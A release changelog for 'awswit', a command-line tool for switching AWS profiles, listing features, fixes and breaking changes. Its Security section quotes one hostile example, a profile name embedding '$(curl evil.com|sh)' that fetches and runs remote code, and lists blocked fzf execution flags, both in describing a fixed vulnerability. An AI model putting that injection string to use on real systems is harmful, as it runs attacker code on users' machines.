# Changelog

All notable changes to this project will be documented in this file.

## v0.1.0

_Released on 2026-05-13_

### Features

- New subcommand `awswit exec PROFILE -- CMD ARGS` runs a command with
  `AWS_PROFILE` (and optionally `AWS_REGION`) set in the child only,
  without mutating the parent shell. Exit code is propagated. Records
  the use for frecency. `--` is optional when CMD has no leading flags.
- New subcommand `awswit pick` opens the picker (TUI or fzf) and prints
  the chosen profile name to stdout — designed for shell substitution
  like `awswit exec "$(awswit pick)" -- aws s3 ls`. Exits 130 on cancel.
- New subcommand `awswit which` reports the active profile with its
  region / account / role / SSO status, including SSO token expiry
  pulled from `~/.aws/sso/cache/*.json`. Exits non-zero when
  `$AWS_PROFILE` points at a profile that's not defined in
  `~/.aws/config`, so CI/precmd guards get an actionable signal.
- New subcommand `awswit doctor` audits `~/.aws/config` and the SSO
  cache and reports:
    - missing `source_profile` chains;
    - **source_profile cycles** (a → b → a — would deadlock the SDK);
    - expired or absent SSO tokens (with the `aws sso login` command
      to fix it);
    - malformed `mfa_serial`;
    - **region-format typos** (`us-east-1a` is an AZ, not a region;
      `useast1`, `eu-west` are flagged);
    - role profiles without any credential source;
    - **shell-unsafe profile names** that other tools wrote (an
      unrendered template variable or hostile section header).
  Exits non-zero on errors. `--json` emits the findings as a JSON
  array for CI consumption.
- New subcommand `awswit prompt --format … --default …` prints the
  current profile (or a fallback) for shell-prompt embedding. Both
  `{}` and `%s` work as the placeholder.
- New flag `awswit -l --names-only` — fast tab-completion fallback
  path that only reads section headers from `~/.aws/config` and
  skips history / SSO cache I/O. Used by every init script's
  completion function.
- Profile-name tab completion in every supported shell (bash, zsh,
  fish, powershell). The init snippet now registers a completer that
  shells out to `awswit -l --names-only` so tab-completion always
  reflects the current `~/.aws/config`.
- New env var `AWSWIT_SSO_CACHE_DIR` overrides the SSO token cache
  directory (default `~/.aws/sso/cache`). Auto-falls-back to a
  `sso/cache` sibling of `$AWS_CONFIG_FILE` when set, so containers
  with `/aws-config/{config,sso/cache}` work out of the box.
- "Did you mean …?" suggestions on `ProfileNotFound`, ranked by
  Levenshtein distance and filtered to candidates that plausibly
  match the typo.
- `awswit -l --json` now includes `favorite`, `use_count`, and
  `last_used` per profile so dashboards / scripts can reproduce the
  picker's frecency-aware ordering.

### Bug fixes

- **TUI: favorite toggles no longer get silently overwritten.** The
  picker previously saved on each `*` press, then `main` re-saved a
  stale snapshot afterwards, reverting the change. The picker now
  returns the updated history; `main` is the single save site.
- TUI: toggling a favorite now re-sorts the list immediately so the
  promoted/demoted profile moves into its new position visibly. The
  cursor follows the toggled profile.
- TUI: handles the "no profiles configured" case with a helpful
  empty-state hint instead of a blank panel.
- **TUI: terminal no longer left in raw mode on a panic.** Replaced
  the manual cleanup in `ProfilePicker::run` with an RAII guard so
  any panic deep in ratatui (degenerate `Rect`, layout math on tiny
  terminals) still restores cooked-mode input.
- **`save_history`: durable & race-tolerant.** `fsync(2)` before
  `rename(2)` so a power loss mid-write can't produce a zero-byte
  history; the temp-file sweep is age-gated (>1 h) so parallel
  awswit invocations under `xargs -P` can't delete each other's
  in-flight temp files.
- **Tolerant `~/.aws/config` parser.** A single malformed section
  header (`[profile bad` missing `]`) previously took down every
  `awswit -l` call — including tab-completion across the whole
  shell. The new parser skips bad sections with a `tracing::warn!`
  and keeps every other profile readable. Drops the `configparser`
  dependency.
- **Non-interactive paths no longer auto-fuzzy-match.** `awswit -n
  prd` used to silently switch you to `prod`; it now errors with a
  "did you mean…?" suggestion and exit 1. Interactive bare-arg
  invocation still auto-corrects for convenience.
- `-n` without a PROFILE arg or `$AWS_PROFILE` set now errors
  instead of silently falling back to `default`.
- `exec` accepts profile-name typos and routes them through the
  same "did you mean…?" suggestion path as the switch command.
- `name.len()` byte-vs-char bug in the "did you mean…?" threshold:
  for non-ASCII profile names the suggestion list previously
  degraded silently. Fixed to compare in `chars().count()`.
- `picker.run()` no longer flattens `io::Error` into a `ShellError`
  string — `PermissionDenied` on `/dev/tty` etc. now surface with
  their kind preserved.

### Security

- **Critical: bash tab-completion no longer executes `$(…)` embedded
  in hostile profile names.** A teammate's IaC tool or another
  process that writes to `~/.aws/config` could put
  `[profile $(curl evil.com|sh)]` and have it run on every TAB.
  Two layers fixed it: `fast_profile_names` now filters out any
  name containing characters outside `[A-Za-z0-9._/@+=-]`, and the
  bash completer quotes each candidate via `printf %q` before
  feeding it to `compgen -W`. zsh/fish/powershell completers were
  not vulnerable; the bash hardening is defense in depth.
- `BLOCKED_FZF_OPTIONS` now blocks fzf 0.41+ RPC flags
  (`--listen`, `--listen-unsafe`, `--with-shell`) alongside the
  existing `--preview` / `--bind` / `--execute` family.

### Cross-platform

- `awswit` data dir on Windows is now `%LOCALAPPDATA%\awswit\`
  instead of the Unix-style `~/.local/share/awswit/` fallback.
- PowerShell completer matches via
  `StartsWith(StringComparison::OrdinalIgnoreCase)` instead of
  `-like`, so profile names containing PowerShell wildcard
  characters (`*`, `?`, `[`, `]`) match literally. Captured
  names are CRLF-trimmed too.
- TUI alt-screen + mouse-capture now wrapped in an RAII guard
  alongside raw-mode, so a panic in ratatui can't leave Windows
  Terminal / conhost eating selection clicks.
- `AWS_CONFIG_FILE=~/.aws/config` now works for the SSO-cache
  auto-detect (the `~` is expanded before deriving the parent).
- Pre-built binaries: added `aarch64-pc-windows-msvc` (Windows on
  ARM) and `x86_64-unknown-linux-musl` (Alpine / scratch
  containers) to the cargo-dist target set.

### Doctor / messages

- `doctor` summary uses integer-aware plurals (`1 error, 0 warnings`)
  instead of `0 error(s), 1 warning(s)`.
- `doctor`'s "role profile has neither source_profile nor
  credential_source" warning includes a concrete fix hint with the
  three valid `credential_source` values.

### TUI improvements

- Standard readline-style keys: `Ctrl-A` (start of line), `Ctrl-E`
  (end of line), `Ctrl-W` (delete word backward) in the search bar.
- Preview pane now wraps long role ARNs and SSO start URLs, shows
  the "last used" relative timestamp, and falls back to the SSO
  start URL row for SSO profiles.

### Shell wrapper

- The init snippet now passes informational subcommands and flags
  (`exec` / `which` / `doctor` / `prompt` / `init` / `completions` /
  `-l` / `-h` / `-v`) through to the binary directly, so their
  output isn't accidentally `eval`'d. Only the switch path uses
  `--shell-export`.

### Breaking changes

- `awswit` now *sets* only `AWS_PROFILE` and `AWS_REGION`, and *clears*
  the legacy `AWS_DEFAULT_PROFILE`/`AWS_DEFAULT_REGION` on every switch
  (and on `awswit -u`). The modern AWS SDK prefers the non-DEFAULT form;
  clearing the legacy variables prevents a previous shell session, CI
  image, or `aws configure` run from leaving a stale fallback that
  silently re-routes credentials to the wrong account. The awswit-
  private `AWSWIT_PROFILE` is gone entirely.
- The shell wrapper protocol (`AWSWIT_UNSET=1` sentinel, line-by-line
  key/value parsing in `bash.sh` / `zsh.sh` / `fish.fish` /
  `powershell.ps1`) is gone. The init snippet is now ~5 lines that does
  `eval "$(command awswit --shell-export "$@")"`. **You must re-source
  your shell init**:
  ```sh
  eval "$(awswit init bash)"     # or zsh / fish / powershell
  ```
- The `~/.awswit/config.toml` file is no longer read. The three knobs
  it offered (`colors`, `fuzzy-match`, `region`) are now handled by:
  - `NO_COLOR=1` (de-facto standard) to disable color in the TUI;
  - `AWSWIT_NO_FUZZY=1` to require exact profile-name matches;
  - `AWS_REGION` env var or `--region` flag for region overrides.
- History moved from `~/.awswit/history.json` to
  `$XDG_DATA_HOME/awswit/history.json` (default
  `~/.local/share/awswit/history.json`). An existing file in the legacy
  location is migrated automatically on first run.

### Features

- `awswit -l` is now machine-readable when piped (tab-separated, no
  headers), human-readable in a terminal, or JSON with `--json`. This
  makes `awswit -l | awk` / `awswit -l --json | jq` actually pleasant.
- `awswit` warns on stderr when `AWS_VAULT` is set, since changing
  `AWS_PROFILE` inside an aws-vault session leaves the vault session
  credentials stranded in the environment.
- Fuzzy match substitution now writes a clear warning to stderr noting
  which profile it actually resolved to, and how to opt out.

### Improvements

- Frecency now uses continuous exponential decay (half-life = 72h)
  instead of four step-function buckets, so ranking changes smoothly
  with time instead of jumping at the bucket boundaries.
- History file is written with the user's umask (no more forced
  `0o600`) — the content is profile names and timestamps, not secrets.
- The pretty-printed list pads the profile column to the widest name
  instead of truncating to 20 characters.

### Internal

- Drop `~/.awswit/config.toml` entirely; remove the `AwswitConfig`
  module.
- Delete `StatusLine` / `crossterm::style::Stylize` — status now goes
  through `tracing` to stderr.
- Significant simplification of `src/shell/export.rs` and
  `src/init/*` (the four init scripts collapse from ~170 LOC of
  bespoke parsing to ~30 LOC of `eval` wrappers).

## v0.0.2

_Released on 2026-04-27_

### Bug Fixes

- Stop validating credential file permissions and reading key material
- *(ci)* Rename artifacts to unique asset names before release upload

### CI

- Split release workflow into separate file

### Miscellaneous

- Collapse if-bodies into match arm guards (clippy 1.95)

## v0.0.1

_Released on 2026-03-15_

Initial release.

- Interactive TUI for AWS profile switching with fuzzy search and frecency sorting
- Non-interactive mode for scripting
- Shell completion support (bash, zsh, fish, powershell)
- Region override via flag, profile config, or awswit config
- fzf integration
